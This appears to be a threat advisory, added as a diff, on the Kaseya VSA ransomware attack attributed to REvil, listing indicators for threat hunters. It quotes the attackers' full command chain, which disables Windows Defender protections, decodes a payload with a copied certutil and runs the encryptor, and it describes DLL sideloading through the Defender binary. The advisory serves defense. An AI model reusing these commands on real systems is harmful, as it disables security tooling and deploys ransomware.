@@ -1,0 +1,18 @@
+
+Each Outbreak Alert includes information about the attack itself, Fortinet product versions that provide protection, which products could break the attack sequence, threat hunting techniques, and other information.
+Go here for the Kaseya Outbreak Alert and here for the REvil Outbreak Alert .
+What to look for Threat indications that you should be aware of include: Initial notifications indicate that the \"KElevated######\" (SQL User) account performed this action.
+VSA admin user accounts are disabled only moments before ransomware is deployed Ransomware encryptor is dropped to c:\\kworking\\agent.exe
+The VSA procedure is named \"Kaseya VSA Agent Hot-fix” At least two tasks run the following:
+C:\\WINDOWS\\system32\\cmd.exe /c ping 127.0.0.1 -n 4979 > nul C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe Set-MpPreference -DisableRealtimeMonitoring $true -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableScriptScanning $true -EnableControlledFolderAccess Disabled -EnableNetworkProtection
+AuditMode -Force
+-MAPSReporting Disabled -SubmitSamplesConsent NeverSend copy /Y
+C:\\Windows\\System32\\certutil.exe C:\\Windows\\cert.exe echo %RANDOM%
+>>
+C:\\Windows\\cert.exe C:\\Windows\\cert.exe -decode
+c:\\kworking\\agent.crt c:\\kworking\\agent.exe del /q /f c:\\kworking\\agent.crt C:\\Windows\\cert.exe & c:\\kworking\\agent.exe
+In addition, the encryptor (agent.exe) is signed with a valid digital signature that includes the following information: Name: PB03 TRANSPORT LTD.
+Email: Brouillettebusiness@outlook.com CN =
+Sectigo RSA Code Signing, CAO =
+Sectigo Limited, L = Salford, S =
+Greater Manchester, C = GB Serial #: 119acead668bad57a48b4f42f294f8f0 Issuer: https://sectigo.com/ When agent.exe runs, the following files are dropped into the hardcoded path C:\\Windows: MsMpEng.exe - the legit Windows Defender executable mpsvc.dll - the encryptor payload that is sideloaded by the legit Defender .EXE
